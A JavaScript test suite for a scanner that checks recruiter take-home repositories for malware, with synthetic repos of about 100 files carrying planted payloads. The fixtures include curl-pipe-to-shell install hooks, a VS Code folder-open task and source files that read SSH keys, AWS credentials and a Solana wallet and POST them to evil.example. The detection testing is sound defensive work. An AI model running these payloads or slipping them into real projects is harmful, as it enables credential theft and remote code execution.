import "./helpers.js";
import test from "node:test";
import assert from "node:assert/strict";
import { scanRepo } from "../src/scan.js";
import { MAX_FILES_FETCHED } from "../src/github.js";
import { memoryClient } from "../scripts/grade.js";

// The tool exists to check the repository a recruiter sends: a working
// application of sixty to a hundred and fifty files with one payload buried
// in it, not the two-file snippet the synthetic samples use. The synthetic
// set proves a rule fires on a string; this proves the scanner reaches the
// string once it is one file among a hundred and thirty. These are two
// different questions, and only the second is the promise on the tin.
//
// The builder is kept small and self-contained here rather than shared with
// the benchmark, so a change to one cannot silently weaken the other.

const COMPONENTS = ["Button", "Card", "Modal", "Table", "Input", "Select", "Badge", "Spinner", "Tabs", "Avatar"];
const PAGES = ["Dashboard", "Portfolio", "Orders", "Markets", "Settings", "Login"];
const HOOKS = ["useAuth", "useOrders", "usePrices", "useDebounce", "useTheme"];

function recruiterRepo({ extraModules = 0, payload = {}, scripts = {} } = {}) {
  const files = {};
  files["package.json"] = JSON.stringify({
    name: "quantflow-dashboard",
    private: true,
    type: "module",
    scripts: { dev: "vite", build: "vite build", test: "vitest run", ...scripts },
    dependencies: { react: "^18.2.0", "react-dom": "^18.2.0", axios: "^1.6.7", zustand: "^4.5.0" },
    devDependencies: { vite: "^5.1.0", vitest: "^1.2.2", typescript: "^5.3.3" },
  }, null, 2);
  files["README.md"] = "# QuantFlow\n\nA take-home. `npm install` then `npm run dev`. Fix the failing test.\n";
  files["vite.config.ts"] = `import { defineConfig } from "vite";\nexport default defineConfig({});\n`;
  files["src/main.tsx"] = `import App from "./App";\n`;
  files["src/App.tsx"] = `export default function App() { return null; }\n`;
  for (const c of COMPONENTS) {
    files[`src/components/${c}.tsx`] = `export const ${c} = () => null;\n`;
    files[`src/components/${c}.test.tsx`] = `import { ${c} } from "./${c}";\n`;
  }
  for (const p of PAGES) files[`src/pages/${p}.tsx`] = `export default function ${p}() { return null; }\n`;
  for (const h of HOOKS) files[`src/hooks/${h}.ts`] = `export function ${h}() {}\n`;
  for (let i = 0; i < extraModules; i++) {
    files[`src/features/module${String(i).padStart(3, "0")}/index.ts`] = `export const id = ${i};\n`;
    files[`src/features/module${String(i).padStart(3, "0")}/helpers.ts`] = `export const h = ${i};\n`;
  }
  Object.assign(files, payload);
  return files;
}

const scanOf = (files) => scanRepo({ owner: "candidate", repo: "quantflow-dashboard", client: memoryClient("candidate", "quantflow-dashboard", files) });

// Each payload is copied from the real campaigns and dropped into a plausible
// place in the tree. The expectation is only that the scan does not come back
// a clean, silent green: it either convicts, or it says out loud that it did
// not read everything.
const PAYLOADS = [
  { name: "postinstall curl|bash", scripts: { postinstall: "curl -sSL https://cdn.evil.example/s.sh | bash" }, payload: {} },
  {
    name: "buried dropper a lifecycle script runs",
    scripts: { postinstall: "node scripts/postinstall.js" },
    payload: { "scripts/postinstall.js": `require("https").request("https://evil.example/c",{method:"POST"}).end(require("fs").readFileSync(require("os").homedir()+"/.ssh/id_rsa","utf8"));\n` },
  },
  {
    name: "VS Code task on folder open",
    payload: { ".vscode/tasks.json": JSON.stringify({ version: "2.0.0", tasks: [{ label: "s", type: "shell", command: "curl -s https://evil.example/i|sh", runOptions: { runOn: "folderOpen" } }] }) },
  },
  {
    name: "plain-source stealer imported by nothing, deep",
    payload: { "src/features/analytics/init.ts": `import { readFileSync } from "fs";\nimport { homedir } from "os";\nimport { request } from "https";\nexport function init() {\n  const d = readFileSync(homedir() + "/.ssh/id_rsa", "utf8");\n  const r = request("https://evil.example/collect", { method: "POST" });\n  r.write(d); r.end();\n}\n` },
  },
];

for (const p of PAYLOADS) {
  test(`recruiter-scale: ${p.name} is caught or the scan admits it was cut short`, async () => {
    const files = recruiterRepo({ extraModules: 30, payload: p.payload ?? {}, scripts: p.scripts ?? {} });
    assert.ok(Object.keys(files).length > 60, "the test tree must be recruiter-sized");
    const scan = await scanOf(files);
    const convicted = scan.verdict === "red" || scan.verdict === "yellow";
    const admitted = scan.notes.some((n) => /never fetched would not be seen/.test(n));
    assert.ok(
      convicted || admitted,
      `silent green on a ${Object.keys(files).length}-file repo carrying ${p.name}: verdict ${scan.verdict}, ${scan.stats.filesScanned} of ${Object.keys(files).length} read, no cap note`,
    );
  });
}

test("recruiter-scale: a full recruiter repo is read to the end, not cut off at 40", async () => {
  // A 90-file working app is comfortably inside the cap, so nothing about it
  // should trip the "not every file was read" note. This is the regression
  // guard on the cap itself: if it ever drops back near 40, this fails.
  const files = recruiterRepo({ extraModules: 25 });
  const count = Object.keys(files).length;
  assert.ok(count > 80 && count <= MAX_FILES_FETCHED, `expected 80..${MAX_FILES_FETCHED} files, got ${count}`);
  const scan = await scanOf(files);
  assert.equal(scan.stats.filesScanned, Object.keys(files).length, "every file of a normal recruiter repo must be read");
  assert.ok(!scan.notes.some((n) => /not every file in this repository was read/.test(n)));
});

test("recruiter-scale: a plain-source stealer in a normal recruiter repo is actually convicted", async () => {
  // The strong form of the promise: not merely "admitted", but caught. A
  // 90-file repo is inside the cap, so the deep stealer is read and must
  // raise a verdict, not a note.
  const files = recruiterRepo({
    extraModules: 25,
    payload: { "src/features/analytics/init.ts": `import { readFileSync } from "fs";\nimport { homedir } from "os";\nimport { request } from "https";\nexport function init() {\n  const loot = [".ssh/id_rsa", ".aws/credentials", ".config/solana/id.json"].map((f) => { try { return readFileSync(homedir() + "/" + f, "utf8"); } catch { return ""; } }).join("");\n  const r = request("https://evil.example/collect", { method: "POST" });\n  r.write(loot); r.end();\n}\n` },
  });
  const scan = await scanOf(files);
  assert.notEqual(scan.verdict, "green", "a credential stealer inside a readable recruiter repo must not be green");
  assert.ok(scan.findings.some((f) => f.file === "src/features/analytics/init.ts"), "the stealer file must appear in the findings");
});
